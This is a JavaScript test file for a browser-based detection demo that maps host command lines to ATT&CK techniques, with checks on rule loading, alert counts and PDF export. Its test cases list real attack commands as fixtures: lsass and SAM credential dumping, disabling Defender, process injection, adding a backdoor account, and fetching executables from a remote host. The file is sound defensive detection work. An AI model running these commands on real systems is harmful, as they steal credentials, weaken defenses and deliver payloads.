// frontend.test.mjs — runs the real browser scripts (js/*.js) in a Node VM with a
// tiny DOM stub, and checks the behaviour the demo depends on.
//
//   node --test tests/        (Node 18+, no npm install needed)
//
// The DOM stub answers every element lookup with an inert object whose
// checkboxes are all ticked, i.e. "all evidence sources on" as on page load.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import vm from "node:vm";

const ROOT = new URL("../", import.meta.url);
const read = (p) => readFileSync(new URL(p, ROOT), "utf8");

function inertElement() {
  return new Proxy(function () {}, {
    get: (_, k) => (k === "checked" ? true : k === "dataset" ? {} : k === "classList" ? { add() {}, remove() {} }
      : k === "querySelectorAll" ? () => [] : inertElement()),
    set: () => true,
    apply: () => inertElement(),
  });
}

function loadApp({ rulesJson } = {}) {
  const ctx = vm.createContext({
    console, URL, Blob, setTimeout, clearInterval, setInterval,
    location: { protocol: "file:", origin: "null" },
    document: { querySelector: () => inertElement(), querySelectorAll: () => [], createElement: () => inertElement(), body: inertElement() },
    fetch: async () => ({ ok: true, json: async () => JSON.parse(rulesJson) }),
  });
  for (const f of ["js/config.js", "js/data.js", "js/rules.js", "js/report.js", "js/app.js"])
    vm.runInContext(read(f), ctx, { filename: f });
  // top-level const/let live in the context's global lexical scope
  // g(): evaluate in the page; j(): same, but copied into this realm via JSON so
  // assert.deepEqual can compare arrays/objects created inside the VM.
  const g = (expr) => vm.runInContext(expr, ctx);
  return { ctx, g, j: (expr) => JSON.parse(g(`JSON.stringify(${expr})`)) };
}

const RULES_JSON = read("rules.json");

test("built-in rule copy is identical to rules.json", () => {
  const { g, j } = loadApp();
  assert.deepEqual(j("BUILTIN_RULES"), JSON.parse(RULES_JSON).rules);
  assert.equal(g("RULES.length"), 14);
  assert.deepEqual(j("compileRules(BUILTIN_RULES).errors"), []);
});

test("demo case is unchanged: 10 events -> 9 alerts -> 8 techniques, 8/8 coverage", () => {
  const { g, j } = loadApp();
  g('MODE = "demo"; EVENTS = DEMO_EVENTS.slice(); ALERTS = detect(EVENTS);');
  assert.equal(g("EVENTS.length"), 10);
  assert.equal(g("ALERTS.length"), 9);
  assert.deepEqual(j("ALERTS.map(a=>a.id)"),
    ["T1059.001", "T1047", "T1053.005", "T1547.001", "T1112", "T1016", "T1033", "T1082", "T1057"]);
  assert.deepEqual(j("statsModel().map(s=>s[1])"), [10, 9, 8, "8 / 8"]);
  const m = g("matrixModel()");
  assert.equal(m.recovered, 8);
  assert.equal(m.warn, false);
});

test("rules.json loaded over http gives the same demo result as the built-in copy", async () => {
  const { g } = loadApp({ rulesJson: RULES_JSON });
  g('location.protocol = "http:"');
  const info = await g("loadRules()");
  assert.equal(info.source, "rules.json");
  g('EVENTS = DEMO_EVENTS.slice(); ALERTS = detect(EVENTS);');
  assert.equal(g("ALERTS.length"), 9);
});

test("invalid rules in rules.json are skipped and reported, valid ones kept", async () => {
  const bad = JSON.stringify({ rules: [
    { id: "T1", sev: "high", rule: "ok", pattern: "evil", flags: "i" },
    { id: "T2", sev: "critical", rule: "bad sev", pattern: "x" },
    { id: "T3", sev: "low", rule: "bad regex", pattern: "(" },
    { id: "T4", sev: "low", rule: "stateful flag", pattern: "x", flags: "g" },
  ] });
  const { g } = loadApp({ rulesJson: bad });
  g('location.protocol = "http:"');
  const info = await g("loadRules()");
  assert.equal(info.count, 1);
  assert.equal(info.errors.length, 3);
});

test("sample CSV still detects its attacks", () => {
  const { g, j } = loadApp();
  const ev = g(`parseCSV(${JSON.stringify(read("data/sample_host_log.csv"))})`);
  assert.equal(ev.length, 9);
  const ids = j(`detect(${JSON.stringify(ev)}).map(a=>a.id)`);
  assert.deepEqual(ids, ["T1059.001", "T1053.005", "T1547.001", "T1082", "T1057", "T1059.001"]);
});

// Each new rule: commands it must catch, and look-alikes it must not.
const CASES = {
  "T1003": {
    hit: ["rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 4868 C:\\x.bin full",   // real EVTX-ATTACK-SAMPLES record
          "mimikatz.exe \"sekurlsa::logonpasswords\" exit",
          "procdump64.exe -accepteula -ma lsass.exe out.dmp",
          "reg save HKLM\\SAM C:\\temp\\sam.save",
          "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q",
          "powershell -nop -c Invoke-Mimikatz -DumpCreds"],
    miss: ["reg save HKCU\\Software\\x C:\\temp\\x.reg", "notepad lsass_notes.txt"],
  },
  "T1562.001": {
    hit: ["powershell Set-MpPreference -DisableRealtimeMonitoring $true",
          "powershell Add-MpPreference -ExclusionPath C:\\Users\\Public",
          "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f",
          "sc stop WinDefend", "net stop windefend"],
    miss: ["powershell Get-MpPreference", "sc query WinDefend"],
  },
  "T1055": {
    hit: ["powershell -c Invoke-ReflectivePEInjection -PEPath x.dll -ProcId 4242",
          "mavinject.exe 4242 /INJECTRUNNING C:\\x.dll"],
    miss: ["mavinject.exe /?", "powershell Get-Process"],
  },
  "T1136": {
    hit: ["net user backdoor P@ss1 /add", "net1 user backdoor /add /domain",
          "powershell New-LocalUser -Name backdoor -NoPassword"],
    miss: ["net user", "net user administrator", "net localgroup administrators backdoor /add"],
  },
  "T1105": {
    hit: ["certutil -urlcache -split -f http://10.0.0.5/x.exe x.exe",
          "bitsadmin /transfer job /download /priority high http://10.0.0.5/x.exe C:\\x.exe",
          "powershell iwr http://10.0.0.5/x.exe -OutFile x.exe",
          "powershell (New-Object Net.WebClient).DownloadFile('http://x/y','y.exe')",
          "curl.exe http://10.0.0.5/x.exe -o x.exe"],
    miss: ["certutil -hashfile x.exe SHA256", "curl.exe --version"],
  },
};

for (const [id, { hit, miss }] of Object.entries(CASES)) {
  test(`rule ${id} catches its technique and ignores look-alikes`, () => {
    const { g, j } = loadApp();
    const first = (cmd) => g(`(detect([{ts:"t",cmd:${JSON.stringify(cmd)}}])[0]||{}).id`);
    for (const cmd of hit) assert.equal(first(cmd), id, `should be ${id}: ${cmd}`);
    for (const cmd of miss) assert.notEqual(first(cmd), id, `should NOT be ${id}: ${cmd}`);
  });
}

test("PDF export produces a structurally valid PDF with the alerts and matrix", () => {
  const { g, j } = loadApp();
  g('MODE = "demo"; EVENTS = DEMO_EVENTS.slice(); ALERTS = detect(EVENTS); INPUT_LABEL = "Demo case victim01";');
  const bytes = g(`buildReportPdf({ generated: new Date("2026-10-29T12:00:00Z"), input: INPUT_LABEL,
      rules: RULES_INFO, stats: statsModel(), alerts: ALERTS, matrix: matrixModel(),
      sources: MX_SOURCES.map(n => [n, true]) })`);
  const pdf = Buffer.from(bytes).toString("latin1");
  assert.ok(pdf.startsWith("%PDF-1.4\n") && pdf.trimEnd().endsWith("%%EOF"));
  // every xref offset must point at the start of "<n> 0 obj"
  const xrefAt = Number(pdf.match(/startxref\n(\d+)/)[1]);
  assert.ok(pdf.startsWith("xref", xrefAt));
  const offsets = [...pdf.slice(xrefAt).matchAll(/^(\d{10}) 00000 n $/gm)].map(m => Number(m[1]));
  offsets.forEach((o, i) => assert.ok(pdf.startsWith(`${i + 1} 0 obj`, o), `object ${i + 1} offset`));
  // every stream /Length must be exact
  for (const m of pdf.matchAll(/<< \/Length (\d+) >>\nstream\n/g)) {
    const start = m.index + m[0].length;
    assert.ok(pdf.startsWith("\nendstream", start + Number(m[1])), "stream length");
  }
  for (const s of ["Detection alerts \\(9\\)", "T1053.005", "8 of 8 techniques recovered", "Rules fired"])
    assert.ok(pdf.includes(s), `PDF should contain ${s}`);
  assert.ok(!/[^\x00-\x7f]/.test(pdf), "PDF is pure ASCII");
});
